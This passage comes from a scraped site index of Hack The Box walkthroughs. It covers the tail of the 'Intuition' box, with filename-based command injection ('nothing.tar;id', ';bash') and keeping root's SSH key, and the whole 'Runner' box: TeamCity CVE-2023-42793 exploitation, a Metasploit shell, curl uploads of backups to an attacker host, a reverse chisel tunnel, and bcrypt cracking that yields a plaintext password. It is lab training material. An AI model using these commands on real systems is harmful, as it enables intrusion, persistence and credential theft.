. the current directory .. the parent directory apt_update.yml And since we can&rsquo;t overwrite apt_update.yml or mask it (or can I?) then following the &ldquo;run&rdquo; branch is probably a dead-end in terms of privesc.
Install action Just like &ldquo;run&rdquo;, the &ldquo;install&rdquo; action requires an auth_code:
If the auth_code is valid and run.role_file is provided, then installRole is called:
Aha! Look at that system call &#x1f601; There is no validation on what we place into run.role_file. After forming a valid json file, I&rsquo;ll get to work in figuring out how to use this for command injection &#x1f6a9;
Red Hat describes Ansible Galaxy as &ldquo;a repository for Ansible Roles that are available to drop directly into your Playbooks to streamline your automation projects.&rdquo;
But we don&rsquo;t care about that. For us, it&rsquo;s just a place to do command injection &#x1f60e;
The JSON file If I&rsquo;m following along properly, there are three different structures that the json file might have, one for each major branch of the code. First, the list one is really simple:
{ &#34;run&#34;: { &#34;action&#34;: &#34;list&#34; } } The run action requires an auth_code and some run details:
{ &#34;auth_code&#34;: &#34;UHI75GHINKOP&#34;, &#34;run&#34;: { &#34;action&#34;: &#34;run&#34;, &#34;num&#34;: 3, } } Likewise for the install action:
{ &#34;auth_code&#34;: &#34;UHI75GHINKOP&#34;, &#34;run&#34;: { &#34;action&#34;: &#34;install&#34;, &#34;role_file&#34;: &#34;&#34; } } That being said, I only really care about the install action. As we saw in the code, the role_file is expected to be a valid tar archive, so let&rsquo;s make one:
cd /tmp/.Tools echo &#34;Hello world&#34; &gt; nothing.txt tar -cvf nothing.tar nothing.txt Runner2 Exploitation And the json file to reference this tar and also take a first attempt at command injection is as follows:
{ &#34;auth_code&#34;: &#34;UHI75GHINKOP&#34;, &#34;run&#34;: { &#34;action&#34;: &#34;install&#34;, &#34;role_file&#34;: &#34;/tmp/.Tools/nothing.tar;id&#34; } } Alright, let&rsquo;s try it out:
&#x1f914; Hmm&hellip; why does it say this is an invalid tar archive?
I guess it&rsquo;s possible that the full string is being parsed. I&rsquo;ll try inserting a null byte \\x00, which should terminate the string in C, but might pass through the JSON:
{ &#34;auth_code&#34;: &#34;UHI75GHINKOP&#34;, &#34;run&#34;: { &#34;action&#34;: &#34;install&#34;, &#34;role_file&#34;: &#34;/tmp/.Tools/nothing.tar\\x00;id&#34; } } &#x1f915; Oof. It liked that even less!
&#x1f4a1; I know what might work. A while ago, I read a really interesting paper called Back to the Future: Unix Wildcards Gone Wild. While it didn&rsquo;t talk about this specifically, it does discuss injecting command arguments inside filenames. So, what if the command injection is in the filename itself?
I&rsquo;ll take a valid/normal tar file and just rename it with a command injection on the end. And I&rsquo;ll reference that role_file with it&rsquo;s actual name. I.e. the command injection takes place at the filesystem level, not within the JSON:
{ &#34;auth_code&#34;: &#34;UHI75GHINKOP&#34;, &#34;run&#34;: { &#34;action&#34;: &#34;install&#34;, &#34;role_file&#34;: &#34;/tmp/.Tools/nothing.tar;id&#34; } } cd /tmp/.Tools/nothing.tar &#39;/tmp/.Tools/nothing.tar;id&#39; OK, let&rsquo;s try running it with the above json contents and tar file name:
&#x1f389; Yes!!! It worked. Now I&rsquo;ll try another payload: /tmp/.Tools/nothing.tar;bash
&#x1f920; We did it! That was a tough box!
The root flag is exactly where you&rsquo;d expect it, at /root/root.txt. Just cat it out for those well-earned points.
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf werkzeug-hash-cracker It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; During this box I also added the private key that was found to my SSH agent. Best to delete it, to save from cluttering up my machine:
ssh-add -d loot/private-8297.key EXTRA CREDIT Taking the SSH Key Since I just cleaned up my exploit from the target&rsquo;s filesystem, I wanted a way to be able to get back in. For example, maybe I forgot to document something, and wanted to log back in to take a screenshot?
Conveniently, the root user has an RSA key already:
It&rsquo;s truly as simple as copy-pasting that key over to the attacker machine, then setting 600 permissions on it:
Server configuration It&rsquo;s totally unnecessary, but I was personally interested in how the Werkzeug + Flask server worked, and how it was containerized. The whole setup can be found in /root/scripts/docker:
Dockerfile docker-compose.yml requirements.txt Cleanup scripts The cleanup scripts were extra annoying on this box, so I wanted to see what all it was doing. the details are in /root/scripts/cleanup/cleanup.sh:
#!/bin/sh /usr/bin/rm -r /opt/ftp/ftp_admin/* /usr/bin/cp -r /root/scripts/cleanup/ftp_admin/* /opt/ftp/ftp_admin/ /usr/bin/rm -r /var/www/app/blueprints/dashboard/pdf_reports/* /usr/bin/rm /var/www/app/blueprints/auth/users.db /usr/bin/cp /root/scripts/cleanup/users.db /var/www/app/blueprints/auth/users.db #/usr/bin/rm /var/www/app/blueprints/report/reports.db #/usr/bin/cp /root/scripts/cleanup/reports.db /var/www/app/blueprints/report/reports.db LESSONS LEARNED Attacker &#x267b;&#xfe0f; Boxes that rely on XSS mechanisms seem to need more resets than most. This box was no exception. I had to do half a dozen resets to finish this one. I wasted hours on the XSS step because I thought my attempts were flawed - it turned out that I had been doing it perfectly and the box just needed a reset!
&#x1f4da; Fingerprint, research, repeat. A huge part of penetration testing is being methodical. When I discovered the exact version of python and urllib that the web app was using, a quick search revealed the vulnerability that allowed our SSRF to take place. Any time you find a version number, just quickly research the version number. Even reading the first page or two of search results is often enough.
&#x1f50d; Use zgrep if it&rsquo;s available. A ton of important logs, especially older logs, are stored within zip or tar archives. Since these can contain sensitive data, it&rsquo;s very important during enumeration to examine these files too. Using zgrep as a drop-in replacement for grep will allow you to gain visibility over archived data without any change to your current workflow.
&#x1f576;&#xfe0f; The SSH agent itself will happily divulge the username of looted private keys. It&rsquo;s not really an advertised feature, but it&rsquo;s a really nice side-effect. If you&rsquo;ve obtained some private keys but don&rsquo;t know the username associated with them, just add them to your SSH agent!
&#x1f4c4; In Linux, everything is a file. Don&rsquo;t rule out that filenames can contain command injection. It&rsquo;s crazy that filenames are much more lax than most people realize: they can contain all sorts of special characters, spaces, double extensions, you name it! There&rsquo;s an asymmetry between actual filename rules, and the de-facto filename conventions that exist - use this to your advantage and try some OS command injections.
&#x21aa;&#xfe0f; Know when you&rsquo;ve done enough RE. It&rsquo;s easy to accidentally go way too far with reverse engineering. On this box, once I realized that the system() call inside runner2 only require a &ldquo;valid&rdquo; tar archive, I happily stopped caring about the tar contents themselves. There was no reason to investigate the checks around the inside of the tar file, because once the file was being parsed, I&rsquo;ve already reached the vulnerable line of code &#x1f44d;
Defender &#x1f645; Even internally-used tools shouldn&rsquo;t be fully trusted. On this box, the developer and administrator&rsquo;s dashboard was vulnerable to really easy XSS. Remember that even the tools used by your technically-minded staff need to have tight security controls. Don&rsquo;t think of it as mistrust of your staff, think of it as protecting your staff from the abuses of all kinds of external threat actors &#x1f917;
&#x1f6a8; Keep your codebase monitored for CVEs. Using something like Github will allow you to have pretty good awareness of when newly-disclosed CVEs might affect your code. On Intuition a fairly recent flaw in urllib exposed the web app to a fairly serious SSRF. This could have easily been patched, if the devs were made aware of the CVE&rsquo;s existence.
&#x1f510; Always use secure protocols. This box relied quite heavily on FTP (not SFTP!), which was a big problem on two occasions: it enabled us to utilize the SSRF by passing credentials within a URL (which would be considered a plaintext, eavesdroppable transmission of credentials), and it enabled us to read the credentials directly out of a login attempt that was recorded in a log file. If you ever find yourself using telnet instead of SSH, using FTP instead of SFTP, HTTP instead of HTTPS, etc&hellip; you should have serious misgivings about it!
&#x1f4f5; It&rsquo;s OK to have stricter rules than the OS. When you&rsquo;re writing little fiddly programs such as a C program to run ansible playbooks, it&rsquo;s not like you&rsquo;re writing kernel code: nobody is going to care if it&rsquo;s not perfectly POSIX compliant - you&rsquo;re allowed to set your own rules and be more strict about things like filenames than the OS requires.
`,url:"https://4wayhandshake.github.io/walkthrough/intuition/"},"https://4wayhandshake.github.io/walkthrough/runner/":{title:"Runner",tags:["TeamCity","Metasploit","Password Cracking","Docker Escape","Portainer"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION Are you ready for HTB&rsquo;s Season 5, Anomalies? I sure am! Runner is the very first box of the season. Thankfully, it&rsquo;s a reasonably straightforward Linux box - rated &ldquo;Medium&rdquo; but actually more on the easy side. The box centers around a cloud-based business that offers a CI/CD solution - basically just hosting JetBrains&rsquo; TeamCity and selling it as a service. While many boxes are pretty far-removed from reality, this one was actually made from a very realistic architecture, where customers run containerized CI/CD pipelines and the service provider has some kind of management product to administer and monitor it all.
Each individual step of this box was relatively easy. A little bit of recon uncovers a vulnerable subdomain. From there, fingerprinting the software will inform vulnerability research and lead into a whole slew of public exploits, making RCE a breeze. If you do a little research on the target before gaining RCE, you&rsquo;ll know exactly what to look for once you do gain a foothold, making the user flag equally simple. After gaining the user flag, the box may feel a little open-ended. However, some local enumeration of the target will definitely point you in the right direction. This biggest surprise with the root flag is that the flag isn&rsquo;t really where you might expect it to be: this box ended a lot more abruptly than I thought.
All in all, Runner is a gentle re-introduction to the competitive HTB seasons. Best of luck for the remainder of the boxes!
RECON nmap scans For this box, I&rsquo;m using a new recon strategy: I took some time recently and automated all of my nmap scans into one tool. Perhaps I&rsquo;ll release it publicly sometime, but in this walkthrough I&rsquo;ll just be providing the console output as usual.
I set $RADDR to the target machine&rsquo;s IP, and proceeded with scanning.
Port scan I started with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8000/tcp open http-alt Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://runner.htb/ 8000/tcp open nagios-nsca Nagios NSCA |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 22 and 80 are very typical, but look what&rsquo;s running on 8000 - Nagios!
&#x1f514; Does that ring a bell? I recently did the box Monitored, which centred around Nagios XI. Check out my walkthrough on it for more detail. It looks like Nagios NSCA is a daemon that allows Nagios to read the status of a remote service.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No new results from this vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 7/udp open|filtered echo 9/udp open|filtered tcpwrapped 19/udp open|filtered tcpwrapped 68/udp open|filtered tcpwrapped 135/udp open|filtered msrpc 136/udp open|filtered tcpwrapped 158/udp open|filtered tcpwrapped 515/udp open|filtered tcpwrapped 998/udp open|filtered tcpwrapped 1026/udp open|filtered win-rpc 1434/udp open|filtered ms-sql-m 1645/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf 30718/udp open|filtered tcpwrapped 49194/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added runner.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=runner.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb $RADDR &amp;&amp; curl -IL http://$RADDR That&rsquo;s the current Nginx version. I&rsquo;ve never heard of TeamCity! though. A search revealed that it&rsquo;s a CI/CD product from JetBrains. The current version is 2024.03.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Alright, that&rsquo;s the expected result. Nothing else though. Now I&rsquo;ll check for subdomains of runner.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v I&rsquo;ll add teamcity.runner.htb to my /etc/hosts file and check out the page. Upon nagivating to it, I was redirected to teamcity.runner.htb/login.html:
The login page shown above includes the TeamCity version number, 2023.05.3, which we already know is almost a year out of date. This is probably something I should look into later &#x1f6a9;
I&rsquo;ll move on to directory enumeration on http://runner.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v Directory enumeration against http://runner.htb/ gave a whole bunch of typical website stuff. Nothing too interesting. Let&rsquo;s check out the subdomain teamcity.runner.htb next:
ffuf -w $WLIST:FUZZ -u http://teamcity.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-teamcity -of json -e php,js,html -timeout 4 TeamCity appears to be a fairly large application. All of the HTTP 401 responses were redirects to the login page. However, there was one interesting HTTP 200 result:
Unfortunately, that page also redirects to the login page&hellip;
Exploring the Website The website on port 80 appears to just be a landing page for Runner. It seems like an online service that wraps TeamCity.
There doesn&rsquo;t appear to be anything interactible on the page. The Get a Quote button has a mailto link, but that&rsquo;s all. I&rsquo;ll avoid this site for now, and instead change my attention to teamcity.runner.htb and to the service on port 8000 (Nagiox NSCA).
TeamCity Since discovering that TeamCity was running an old version, it seemed smart to check for known exploits. Searchsploit shows something juicy:
RCE? Fantastic - let&rsquo;s check that out. Reading through the code, it looks like the vulnerability was reported as CVE-2023-42793, and was a pretty big deal last year (I didn&rsquo;t know).
It looks like it works by requesting an authentication token from the TeamCity REST API, then using that token to create a new admin user:
FOOTHOLD CVE-2023-42793 The exploit shown in searchsploit looked quite straightforward and promising, so I tried it right away. Unfortunately, it didn&rsquo;t produce any result. However, when you find a hint of such a high-profile vulnerability, it&rsquo;s usually a good idea to check Github too&hellip;
Thankfully, there were tons of options to choose from. The next one I tried was this one, by @H454NSec. It worked without any trouble at all:
Indeed, the user it created got me admin access, past that teamcity.runner.htb/login.html page:
TeamCity While the TeamCity dashboard appears to be empty, and there are no current projects, we do seem to be able to edit project settings. Perhaps I can even set up a new build pipeline?
&#x1f4a1; This is starting to remind me of another HTB box, Builder.
For that box, we took over a Jenkins server and set up a build pipeline to gain RCE on the target. Maybe it will be possible to do something similar with TeamCity?
I also see that there are some SSH keys on the TeamCity server. You&rsquo;re able to register keys into TeamCity so that it can access your VCS repos using SSH authentication.
Again, this was a pretty high-provile vulnerability. While I could probably fumble around in this dashboard for a while and figure out how to gain RCE, I&rsquo;m sure there&rsquo;s someone else out there that has done it better.
A little bit of searching brought me to the Rapid7 post on this CVE (and related ones). Surprise, surprise: there is a metasploit module for it! Let&rsquo;s switch over to msfconsole and try it out.
I&rsquo;ll use (0) with Linux presets. Checking show options on this exploit, I see that it intends to use ports 8080 and 4444, so I&rsquo;ll open those then configure the exploit:
sudo ufw allow from $RADDR to any port 4444,8080 proto tcp Meterpreter session open! That was easy &#x1f609;
I&rsquo;m much more comfortable in a system shell, so let&rsquo;s pop into that instead:
shell which python python3 perl php bash # python3 is present python3 -c &#39;import pty; pty.spawn(&#34;/usr/bin/bash&#34;);&#39; Taking a quick look around, I seem to be lacking quite a few tools. For example, I don&rsquo;t even have netstat. Perhaps I&rsquo;m in a container? TBD.
For now though, I know of some important loot I should grab: the SSH private keys. According to the TeamCity docs, they should be located in &lt;TeamCity Data Directory&gt;/config/projects/&lt;project&gt;/pluginData/ssh_keys. I wasn&rsquo;t quite sure what the &lt;TeamCity Data Directory&gt; would be, so I just searched for it:
find / -type d -name ssh_keys 2&gt;/dev/null # /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys Perfect - right where they should be. Since one of these is called john, I&rsquo;m really hoping that john was lazy and simply re-used a more general-purpose SSH private key &#x1f605;
While there are more elegant ways to do it, I simply copy-pasted each of these private keys over to my attacker machine. I can also get the public keys from the TeamCity dashboard if I want them.
On my attacker machine, I tried logging as john using SSH:
Unfortunately, john seems to also require a password even when using key-based authentication.
Although it seemed unlikely, I also attempted logins with the other two keys I found. Much to my surprise&hellip;
Wow! Using id_rsa worked for logging in as john! &#x1f389;
The SSH connection for john drops you into /home/john, adjacent to the user flag. Simply cat it out for the points:
USER FLAG Finishing Enumeration Just to be thorough, I decided I should finish up the local enumeration I had started earlier, during foothold. Interestingly, I found a file a couple directories &ldquo;up&rdquo; from ssh_keys called project-config.xml.1:
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;project xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; uuid=&#34;74bcc617-7a28-47cb-9b99-809e598e90f7&#34; xsi:noNamespaceSchemaLocation=&#34;https://www.jetbrains.com/teamcity/schemas/2021.1/project-config.xsd&#34;&gt; &lt;name&gt;M-Projects&lt;/name&gt; &lt;description&gt;Matthew&#39;s projects&lt;/description&gt; &lt;parameters /&gt; &lt;cleanup /&gt; &lt;/project&gt; There&rsquo;s a clear mention of someone named Matthew. I wonder who this is? &#x1f50d;
I did a find for any files containing the word john:
find / maxdepth 8 -type f ! -path &#39;/proc/*&#39; ! -path &#39;/dev/*&#39; -exec grep &#34;john&#34; {} + Naturally, the list of results was very very long. However, near the bottom I found something very promising, in /data/teamcity_server/datadir/system/buildserver.log:
INSERT INTO USERS VALUES(1,&#39;admin&#39;,&#39;$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye&#39;,&#39;John&#39;,&#39;john@runner.htb&#39;,1713649075462,&#39;BCRYPT&#39;) That&rsquo;s a password hash. With any luck, I&rsquo;ll be able to cract that hash and know the password for john. Even though I already have an SSH login, it might be useful to also have a password.
Cracking the hash # Check what the name of the hash format is name-that-hash -t &#39;$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye&#39; # It&#39;s &#34;bcrypt&#34; in john, or mode 3200 in hashcat echo -n &#39;$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye&#39; &gt; hash.txt WLIST=/usr/share/wordlists/rockyou.txt hashcat -m 3200 hash.txt $WLIST Ok, that will take about 25 minutes - so I&rsquo;ll let it run and check back later. In the meantime, I&rsquo;ll keep looking around this system.
I figured that a good place to start was the log file where I obtained that password hash. From there, I found some other interesting lines:
INSERT INTO USERS VALUES(11,&#39;city_adminwhuv&#39;,&#39;$2a$07$eUwRkt5HJl1DZKr9py62sePYSi7sVG9sMVjZh1h4U6oIJ6IMCf0xa&#39;,NULL,&#39;angry-admin@funnybunny.org&#39;,1713645885602,&#39;BCRYPT&#39;) Alright, that&rsquo;s another account. I&rsquo;ll be sure to add that to the list of hashes to crack&hellip;
I also found some very interesting-looking backup files at /data/teamcity_server/datadir/backup:
-rw-r----- 1 tcuser tcuser 266K Apr 20 20:51 TeamCity_Backup_20240420_205139.zip -rw-r----- 1 tcuser tcuser 266K Apr 20 20:54 TeamCity_Backup_20240420_205442.zip This box doesn&rsquo;t have nc, and I don&rsquo;t have an SSH login, so instead of my usual methods, I&rsquo;ll use a Python UploadServer:
sudo ufw allow from $RADDR to any port 8001 proto tcp mkdir uploadserver &amp;&amp; cd uploadserver python3 -m uploadserver 8001 Then, from the target, I&rsquo;ll upload the two backup .zip files:
mkdir /tmp/.Tools cp /data/teamcity_server/datadir/backup/TeamCity* /tmp/.Tools/ curl -X POST http://10.10.14.15:8001/upload -F &#39;files=@/tmp/.Tools/TeamCity_Backup_20240420_205139.zip&#39; curl -X POST http://10.10.14.15:8001/upload -F &#39;files=@/tmp/.Tools/TeamCity_Backup_20240420_205442.zip&#39; Back on the attacker box, I unzipped these files and took a look. Unsurprisingly, there was a database backup. Inside each of the backup zip files, the database backup had a Users table, and they each held a previously-unseen password hash, for matthew.
Both backup files held exactly the same password hashes. Andt hose hashes matched the non-backup ones that I found in the live system.
I added these to my hash file, and re-started my hash cracking:
hashcat -m 3200 hashes.txt $WLIST After a very short time, I had a result: matthew : piper123
ROOT FLAG Local Enumeration The home directory for john doesn&rsquo;t seem to have anything super interesting in it. I also tried changing users to matthew using su, but didn&rsquo;t have any luck.
There is, however, a conspicuous nonstandard directory at the filesystem root: /data. There&rsquo;s a subdirectory that we can read as john:
Interesting&hellip; matthew owns the directories. Perhaps this indicates we&rsquo;ll need to pivot to matthew before root?
I&rsquo;ll run through my typical &ldquo;manual&rdquo; local enumeration procedure, just so I don&rsquo;t miss anything obvious:
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -vE &#39;^sync:&#39; The only significant users are john, matthew and root. What directories does john own?
find / -user $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; find / -group $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; Just their home directory, pretty much. Do we have access to any particularly useful tools?
which nc netcat socat curl wget python python3 perl php tmux # nc, netcat, curl, wget, python3, perl, tmux What processes are listening for connections?
So listening externally, we see TCP 22, 80, and 8000 again. But now we can see some TCP ports listening internally too:
9000: Uncommon port, but might be PHP-FPM (FastCGI Process Manager)? 5005: TeamCity server default port 8111: default HTTP port for TeamCity 9443: probably some custom service using SSL/TLS? I should follow-up on all of these. &#x1f6a9; I&rsquo;ll open a SOCKS5 proxy for my attacker machine to connect to all of these internal services. See the following section for more detail.
Continuing on with enumeration, I&rsquo;ll check the network interfaces to investigate any containers:
Next I&rsquo;ll check crontab, cron.d, /var/spool/cron/crontabs, anacrontab and systemd timers. No significant results were found though. Are there any SUID/SGID executables that seem out of place?
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Nope, all normal there. I&rsquo;ll check the target&rsquo;s kernel version using Linux Exploit Suggester, by copying the output of uname -a:
linux-exploit-suggester.sh --uname &#39;Linux runner 5.15.0-102-generic #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux&#39; Amongst some usual false-positives, it suggests that the target may be vulnerable to DirtyPipe. Definitely worth checking later &#x1f6a9;
I&rsquo;ll check for binaries with unusual capabilities:
getcap -r / 2&gt;/dev/null Just normal stuff. What about running services?
Most of this looks pretty normal. I&rsquo;m not familiar with portainer.service though. From what I can tell, it&rsquo;s kinda like Kubernetes? I&rsquo;ll also need to follow-up on this &#x1f6a9;
Chisel SOCKS Proxy To access the internally-listening services I found during enumeration, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
socks5 127.0.0.1 1080 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse &amp; Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; LinPEAS I&rsquo;ll run LinPEAS to see if I missed anything important during my initial enumeration.
I should have checked DNS info, because there&rsquo;s a subdomain in there that I was not expecting, portainer-administration.runner.htb:
I&rsquo;ll add this new subdomain to my /etc/hosts file and check it out next &#x1f6a9;
&#x26a0;&#xfe0f; I&rsquo;ve noticed that it&rsquo;s pretty much futile to try to transfer tools onto this machine. In the last few minutes, both of the directories I created, /tmp/.Tools and /dev/shm/.Tools have been completely wiped out&hellip; &#x1f914;
The thing that looks most out-of-place about all this seems to be this portainer thing. I&rsquo;ll check that out first.
Internally-listening TCP Ports Since I have a SOCKS5 proxy open, I&rsquo;ll check out what is running on each of those ports that I found during enumeration.
First up is port 9000:
proxychains nc 127.0.0.1 9000 # &#34;HTTP Bad Request&#34; aha so it must be http proxychains curl http://127.0.0.1:9000 # Some kind of page for Portainer. I&#39;ll save it and open it in a browser proxychains curl http://127.0.0.1:9000 -o source/port_9000.html firefox source/port_9000.html That&rsquo;s interesting&hellip; I&rsquo;ll have to investigate this Portainer thing next &#x1f6a9;
Port 9443
First, I&rsquo;ll grab the banner using nc, if there is one:
No, there&rsquo;s no response&hellip; I&rsquo;ll take a guess and try http:
Alright, that verifies that it&rsquo;s https. Trying again, and using the -k switch, we see seeminly the same result as port 9000:
Alright then - It seems that Port 9000 and Port 9443 are counterparts of the same service, with HTTP on port 9000 and HTTPS on port 9443. It seems very clear that I should investigate Portainer next.
Portainer The Portainer documentation urges you to understand the architecture before proceeding. Thankfully, they provide a handy graphic:
This graphic also identifies TCP port 9443: it looks like it&rsquo;s some kind of Portainer management and polling service. It&rsquo;s also the port that we should be able to access the dashboard on.
My enumeration earlier uncovered the subdomain portainer-administration.runner.htb, so why not check that out and see if it connects to either port 9000 or 9443?
Navigating to that subdomain brings us to a Portainer login page. I&rsquo;ll try some simple credentials, starting with the one I recovered earlier from hash for matthew from the database backup:
&#x1f609; Haha, perfect - First try! Logging in brings us to a dashboard:
Portainer Dashboard Clicking on the environment shown above, it looks like we can check the container (basically just an interface for docker), what images we have stored, what volumes it is connected to, and networking info:
To identify the container, I looked at what images we have available:
Alright, so our one container is clearly the one that&rsquo;s running TeamCity. Not too surprising.
The container is connected to one volume, called t2p. It connects /var/lib/docker/volumes/t2p/_data from the host system to /mnt/root inside the container. For what it&rsquo;s worth, I checked the mount point, but it&rsquo;s inaccessible as john (owner is root).
The Networks view shows a bunch of information we already knew by examining the host system. Seemingly nothing important.
The Container button is basically an interface to do anything Docker can do. This includes docker exec. As such, this functionality in Portainer is enough to give us a terminal into the container (called t2ppwn), through the Console view:
I took a little look around inside the container. And yep, this is definitely the TeamCity instance that we just escaped from when we escalated to john. We&rsquo;re also logged in as the same user as before, tcuser.
&#x1f914; This is the container that I used to gain an initial foothold&hellip; We escaped from this to escalate to john.
Thinking of this like a puzzle, not an actual engagement, what is the logical next step? If Portainer is only granting me access to something I already had access to, then there must be something else. What does Portainer do for us that we didn&rsquo;t already have?
Ahh, I see! I was fooled by a deceptive UI! Compare these two images:
&#x1f605; Yeah, I didn&rsquo;t see it at first either.
We can use this feature to log into the container as any user. Maybe with root access, I&rsquo;ll be able to reach something I couldn&rsquo;t before? I know of a few docker-escape privesc methods that rely on having the root user inside the container to be able to escalate privilege outside the container (in the host system).
This drops us into a shell at /mnt. There&rsquo;s a single directory called root, seemingly holding a whole rootfs. I&rsquo;ll check that out:
Wait, what?! The root flag was inside the container? Nice &#x1f601;
Just cat the flag for the points:
cat root.txt Congratulations on finishing the first box of Season 5 &#x1f389;
CLEANUP Attacker On my attacker box, I&rsquo;ll get rid of all the stray ufw rules I created. It&rsquo;s a good policy to clear this stuff out. This just deletes all the rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; Since I have a personal instance for this box, there&rsquo;s no extra cleanup necessary on the target - I&rsquo;ll just terminate the instance instead.
LESSONS LEARNED Attacker &#x1f4d4; Think less, research more. I uncovered the version of TeamCity that the target was using and realized it was vulnerable pretty quickly. However, I was partway through writing my own exploit for it when I realized that the vulnerability I was facing was actually pretty famous. Even a cursory search on Github and NVD revealed a plethora of actionable information. There was definitely no reason to &ldquo;reinvent the wheel&rdquo; on this one.
&#x1f4cd; Explore manually while you enumerate. When facing a web target, I find it helpful to queue up a couple ffuf scans at once, then manually explore the target. In this case, the website was unimportant to actually exploiting the target, but was helpful for gaining an understanding of the fictional business that the target used. Also, taking the time to read through the TeamCity documentation was quite helpful, because I knew exactly where to look for loot once I gained a foothold.
Defender &#x1f419; CI/CD tools should be bulletproof: stay updated and stable. This goes double if you&rsquo;re selling CI/CD as a service: not only are you putting your own business at risk, you&rsquo;re endangering all of your clients and potentially all of their customers. It is absolutely essential to use the latest well-tested stable branch of a CI/CD tool, and to stay especially attuned to any news about that product. As far as I know, the critical (CVSS 9.8) vulnerability was patched within a week of disclosure, but this &ldquo;Runner&rdquo; company was running a version over a year old.
